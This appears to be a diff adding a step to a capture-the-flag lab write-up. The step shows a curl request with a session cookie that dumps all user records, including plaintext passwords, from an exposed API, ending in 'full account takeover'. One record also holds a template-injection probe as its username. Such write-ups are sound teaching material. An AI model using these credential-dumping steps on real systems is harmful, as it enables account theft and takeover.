@@ -176,5 +176,61 @@ With this i can dump all credentials of the users
 Looking at `app.py` i see there is an api which holds user info
 
 ```python
-
+curl http://verbose.hsm/api/users/all -H 'Cookie: session=eyJyb2xlIjoidXNlciIsInNlc3Npb25faWQiOiJiNWI1NWE3Ny1iNzY1LTRiZWMtYTQ0My0xODI0NjZjNzU3MTEiLCJ1c2VyIjoiZXRoYW4ifQ.apmwRg.ApN1ZuGg0i8O8cbmm61N2h4rJsc' -H 'Content-Type: application/json' | jq .
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100    688 100    688   0      0   3489      0                              0
+[
+  {
+    "email": "tony@hacksmarter.local",
+    "id": 1,
+    "mfa": null,
+    "password": "basketball",
+    "role": "user",
+    "username": "tony"
+  },
+  {
+    "email": "johnny@hacksmarter.local",
+    "id": 2,
+    "mfa": null,
+    "password": "dolphin",
+    "role": "user",
+    "username": "johnny"
+  },
+  {
+    "email": "admin@hacksmarter.local",
+    "id": 3,
+    "mfa": null,
+    "password": "YouWontGetThisPasswordYouNoobLOL123",
+    "role": "admin",
+    "username": "admin"
+  },
+  {
+    "email": "student@hacksmarter.local",
+    "id": 4,
+    "mfa": null,
+    "password": "liverpool",
+    "role": "user",
+    "username": "student"
+  },
+  {
+    "email": "ethan@hacksmarter.com",
+    "id": 5,
+    "mfa": null,
+    "password": "password",
+    "role": "user",
+    "username": "{{7*7}}"
+  },
+  {
+    "email": "ethan@hacksmarter.com",
+    "id": 6,
+    "mfa": null,
+    "password": "password",
+    "role": "user",
+    "username": "ethan"
+  }
+]
 ```
+
+Its now full account takeover
+
